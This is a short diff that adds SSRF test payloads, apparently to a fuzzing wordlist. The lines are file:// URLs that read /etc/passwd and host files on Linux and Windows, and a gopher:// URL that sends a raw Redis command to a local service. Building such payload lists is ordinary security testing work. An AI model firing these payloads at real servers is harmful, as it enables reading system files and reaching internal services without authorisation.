@@ -1,0 +1,8 @@
+# file://
+file:///etc/passwd
+file:///etc/hosts
+file://C:\\Windows\\System32\\drivers\\etc\\hosts
+
+# gopher:// (example Redis quit)
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
+
